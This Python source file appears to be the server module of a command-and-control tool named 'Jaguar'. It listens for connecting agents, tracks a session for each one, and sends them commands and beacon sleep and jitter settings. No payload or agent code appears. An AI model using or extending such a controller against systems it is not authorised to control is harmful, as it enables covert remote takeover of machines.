# -*- coding: utf-8 -*-
"""Servidor TCP Jaguar: escucha y crea una Sesión por cada agente que entra."""
import socket
import threading
import uuid

from PyQt6.QtCore import QObject, pyqtSignal

from jaguar.common.constants import PUERTO_DEFECTO, TIMEOUT_SOCKET
from jaguar.server.sesion import Sesion


class Servidor(QObject):
    cliente_conectado = pyqtSignal(str, dict)
    cliente_desconectado = pyqtSignal(str)
    mensaje_recibido = pyqtSignal(str, dict)
    log = pyqtSignal(str)

    def __init__(self, puerto=PUERTO_DEFECTO):
        super().__init__()
        self.puerto = int(puerto)
        self.sesiones = {}
        self._sock = None
        self._hilo = None
        self._activo = False

    def iniciar(self, puerto=None):
        if puerto:
            self.puerto = int(puerto)
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(("0.0.0.0", self.puerto))
        self._sock.listen(64)
        self._activo = True
        self._hilo = threading.Thread(target=self._aceptar, daemon=True)
        self._hilo.start()
        self.log.emit(f"[servidor] escuchando en 0.0.0.0:{self.puerto}")

    def _aceptar(self):
        while self._activo:
            try:
                conn, addr = self._sock.accept()
            except OSError:
                break
            try:
                conn.settimeout(TIMEOUT_SOCKET)
                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # <- fluidez
            except Exception:
                pass
            cid = uuid.uuid4().hex
            ses = Sesion(cid, conn, addr, self)
            self.sesiones[cid] = ses
            ses.iniciar()

    def detener(self):
        self._activo = False
        try:
            if self._sock:
                self._sock.close()
        except Exception:
            pass
        for cid in list(self.sesiones):
            try:
                self.sesiones[cid].cerrar()
            except Exception:
                pass
        self.log.emit("[servidor] detenido")

    def enviar_comando(self, cid, cmd, args=None):
        ses = self.sesiones.get(cid)
        if ses:
            ses.enviar_comando(cmd, args or {})

    def enviar_beacon(self, cid, sleep, jitter):
        ses = self.sesiones.get(cid)
        if ses:
            ses.enviar_beacon(sleep, jitter)